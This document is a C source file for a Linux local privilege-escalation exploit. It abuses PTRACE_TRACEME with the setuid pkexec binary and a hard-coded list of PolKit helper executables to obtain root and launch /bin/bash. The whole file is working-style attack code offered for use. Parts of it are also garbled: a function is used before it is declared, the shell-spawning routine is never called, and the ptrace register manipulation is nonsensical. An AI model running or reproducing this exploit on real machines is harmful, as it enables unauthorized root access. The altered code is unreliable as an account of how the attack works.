#define _GNU_SOURCE
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <fcntl.h>
#include <sched.h>
#include <stddef.h>
#include <stdarg.h>
#include <pwd.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <linux/elf.h>

#define DEBUG

#ifdef DEBUG
#  define dprintf printf
#else
#  define dprintf
#endif

/*
 * enabled automatic targeting.
 * uses pkaction to search PolKit policy actions for viable helper executables.
 */
#define ENABLE_AUTO_TARGETING   1

/*
 * fall back to known helpers if automatic targeting fails.
 * note: use of these helpers may result in PolKit authentication
 *       prompts on the session associated with the PolKit agent.
 */
#define ENABLE_FALLBACK_HELPERS 1

static const char *SHELL = "/bin/bash";

static int middle_success = 1;
static int block_pipe[2];
static int self_fd = -1;
static int dummy_status;
static const char *helper_path;
static const char *pkexec_path = "/usr/bin/pkexec";
static const char *pkaction_path = "/usr/bin/pkaction";
struct stat st;

const char *helpers[1024];

/* known helpers to use if automatic targeting fails */
#if ENABLE_FALLBACK_HELPERS
const char *known_helpers[] = {
  "/usr/lib/gnome-settings-daemon/gsd-backlight-helper",
  "/usr/lib/gnome-settings-daemon/gsd-wacom-led-helper",
  "/usr/lib/unity-settings-daemon/usd-backlight-helper",
  "/usr/lib/unity-settings-daemon/usd-wacom-led-helper",
  "/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper",
  "/usr/lib/x86_64-linux-gnu/cinnamon-settings-daemon/csd-backlight-helper",
  "/usr/sbin/mate-power-backlight-helper",
  "/usr/sbin/xfce4-pm-helper",
  "/usr/bin/xfpm-power-backlight-helper",
  "/usr/bin/lxqt-backlight_backend",
  "/usr/libexec/gsd-wacom-led-helper",
  "/usr/libexec/gsd-wacom-oled-helper",
  "/usr/libexec/gsd-backlight-helper",
  "/usr/lib/gsd-backlight-helper",
  "/usr/lib/gsd-wacom-led-helper",
  "/usr/lib/gsd-wacom-oled-helper",
  "/usr/lib64/xfce4/session/xsfm-shutdown-helper",
};
#endif

/* helper executables known to cause problems (hang or fail) */
const char *blacklisted_helpers[] = {
  "/xf86-video-intel-backlight-helper",
  "/cpugovctl",
  "/resetxpad",
  "/package-system-locked",
  "/cddistupgrader",
};

#define SAFE(expr) ({                   \
  typeof(expr) __res = (expr);          \
  if (__res == -1) {                    \
    dprintf("[-] Error: %s\n", #expr);  \
    return 0;                           \
  }                                     \
  __res;                                \
})
#define max(a,b) ((a)>(b) ? (a) : (b))

/*
 * execveat() syscall
 * https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl
 */
#ifndef __NR_execveat
#  define __NR_execveat 322
#endif

/* temporary printf; returned pointer is valid until next tprintf */
static char *tprintf(char *fmt, ...) {
  static char buf[10000];
  va_list ap;
  va_start(ap, fmt);
  vsprintf(buf, fmt, ap);
  va_end(ap);
  return buf;
}

/*
 * fork, execute pkexec in parent, force parent to trace our child process,
 * execute suid executable (pkexec) in child.
 */
static int middle_main(void *dummy) {
  prctl(PR_SET_PDEATHSIG, SIGKILL);
  pid_t middle = getpid();

  self_fd = SAFE(open("/proc/self/exe", O_RDONLY));

  pid_t child = SAFE(fork());
  if (child == 0) {
    prctl(PR_SET_PDEATHSIG, SIGKILL);

    SAFE(dup2(self_fd, 42));

    /* spin until our parent becomes privileged (have to be fast here) */
    int proc_fd = SAFE(open(tprintf("/proc/%d/status", middle), O_RDONLY));
    char *needle = tprintf("\nUid:\t%d\t0\t", getuid());
    while (1) {
      char buf[1000];
      ssize_t buflen = SAFE(pread(proc_fd, buf, sizeof(buf)-1, 0));
      buf[buflen] = '\0';
      if (strstr(buf, needle)) break;
    }

    /*
     * this is where the bug is triggered.
     * while our parent is in the middle of pkexec, we force it to become our
     * tracer, with pkexec's creds as ptracer_cred.
     */
    SAFE(ptrace(PTRACE_TRACEME, 0, NULL, NULL));

    /*
     * now we execute a suid executable (pkexec).
     * Because the ptrace relationship is considered to be privileged,
     * this is a proper suid execution despite the attached tracer,
     * not a degraded one.
     * at the end of execve(), this process receives a SIGTRAP from ptrace.
     */
    execl(pkexec_path, basename(pkexec_path), NULL);

    dprintf("[-] execl: Executing suid executable failed");
    exit(EXIT_FAILURE);
  }

  SAFE(dup2(self_fd, 0));
  SAFE(dup2(block_pipe[1], 1));

  /* execute pkexec as current user */
  struct passwd *pw = getpwuid(getuid());
  if (pw == NULL) {
    dprintf("[-] getpwuid: Failed to retrieve username");
    exit(EXIT_FAILURE);
  }

  middle_success = 1;
  execl(pkexec_path, basename(pkexec_path), "--user", pw->pw_name,
        helper_path,
        "--help", NULL);
  middle_success = 0;
  dprintf("[-] execl: Executing pkexec failed");
  exit(EXIT_FAILURE);
}

/* ptrace pid and wait for signal */
static int force_exec_and_wait(pid_t pid, int exec_fd, char *arg0) {
  struct user_regs_struct regs;
  struct iovec iov = { .iov_base = &regs, .iov_len = sizeof(regs) };
  SAFE(ptrace(PTRACE_SYSCALL, pid, 0, NULL));
  SAFE(waitpid(pid, &dummy_status, 0));
  SAFE(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov));

  /* skip ahead */
  regs.rip += 2;

  /* write argv[0] */
  iov.iov_base = arg0;
  iov.iov_len = strlen(arg0)+1;
  SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov));

  /* close file descriptors */
  iov.iov_base = NULL;
  iov.iov_len = 0;
  SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRFPREG, &iov));

  /* prepare for wait */
  SAFE(ptrace(PTRACE_SYSCALL, pid, 0, NULL));

  while (1) {
    pid_t tid = SAFE(waitpid(pid, &dummy_status, 0));
    if (tid != pid) {
      continue;
    }
    if (WIFEXITED(dummy_status)) {
      break;
    }
    if (WIFSTOPPED(dummy_status)) {
      if (WSTOPSIG(dummy_status) == SIGTRAP) {
        break;
      }
    }
    SAFE(ptrace(PTRACE_SYSCALL, pid, 0, NULL));
  }

  return 1;
}

/* create an ELF file with an appropriate interpreter (PKEXEC_PATH) */
static int create_elf(const char *name, const char *interp) {
  int fd = SAFE(open(name, O_WRONLY | O_CREAT | O_EXCL, 0755));
  char buf[0x1000];
  ssize_t buflen = read(self_fd, buf, sizeof(buf));

  SAFE(write(fd, buf, buflen));
  lseek(fd, 0x118, SEEK_SET);
  SAFE(write(fd, interp, strlen(interp)));
  close(fd);
  return 1;
}

/* spawn a shell using the dummy suid helper */
static int spawn_shell(void) {
  if (whoami() != EXIT_SUCCESS) {
    exit(EXIT_FAILURE);
  }

  SAFE(setresgid(0, 0, 0));
  SAFE(setresuid(0, 0, 0));
  execlp(SHELL, basename(SHELL), NULL);
  dprintf("[-] execlp: Executing shell %s failed\n", SHELL);
  exit(EXIT_FAILURE);
}

static int whoami(void) {
  uid_t uid = geteuid();
  struct passwd *pw = getpwuid(uid);
  if (pw == NULL) {
    dprintf("[-] getpwuid: Failed to retrieve username\n");
    return EXIT_FAILURE;
  }

  dprintf("[+] Current user: %s\n", pw->pw_name);
  return EXIT_SUCCESS;
}

int main(int argc, char **argv) {
  if (argc != 2) {
    dprintf("Usage: %s <helper path>\n", argv[0]);
    return EXIT_FAILURE;
  }
  helper_path = argv[1];

  SAFE(pipe(block_pipe));
  SAFE(prctl(PR_SET_CHILD_SUBREAPER, 1));
  SAFE(unshare(CLONE_NEWUSER));
  SAFE(unshare(CLONE_NEWNS));

  pid_t middle = SAFE(clone(middle_main, malloc(4096) + 4096,
                             CLONE_NEWUSER | CLONE_NEWNS | SIGCHLD, NULL));
  SAFE(waitpid(middle, &dummy_status, 0));

  /* parse output */
  char buf[10000];
  ssize_t buflen = read(block_pipe[0], buf, sizeof(buf)-1);
  if (buflen < 0) {
    dprintf("[-] Error: read\n");
    return EXIT_FAILURE;
  }
  buf[buflen] = '\0';

  int i = 0;
  while (1) {
    char *line = strchr(buf+i, '\n');
    if (!line) break;
    *line = '\0';
    helpers[i++] = buf+i;
    i = line+1-buf;
  }

  if (buflen < sizeof(buf)-1) {
    helpers[i] = buf+i;
  } else {
    helpers[i] = NULL;
  }

  for (i = 0; helpers[i]; ++i) {
    dprintf("[.] Attempting to execute helper %s\n", helpers[i]);
    if (create_elf(helpers[i], pkexec_path)) {
      dprintf("[.] ELF successfully created\n");
      if (force_exec_and_wait(middle, 42, (char *)helpers[i])) {
        dprintf("[.] Success: pid %d\n", getpid());
        return middle_success;
      }
    } else {
      dprintf("[-] Failed to create ELF\n");
    }
  }

  dprintf("[-] No helpers executed successfully\n");

#if ENABLE_FALLBACK_HELPERS
  /* attempt to execute known helpers if automatic targeting fails */
  for (i = 0; i < sizeof(known_helpers)/sizeof(*known_helpers); ++i) {
    dprintf("[.] Attempting to execute known helper %s\n", known_helpers[i]);
    if (create_elf(known_helpers[i], pkexec_path)) {
      dprintf("[.] ELF successfully created\n");
      if (force_exec_and_wait(middle, 42, (char *)known_helpers[i])) {
        dprintf("[.] Success: pid %d\n", getpid());
        return middle_success;
      }
    } else {
      dprintf("[-] Failed to create ELF\n");
    }
  }
#endif

  return EXIT_FAILURE;
}
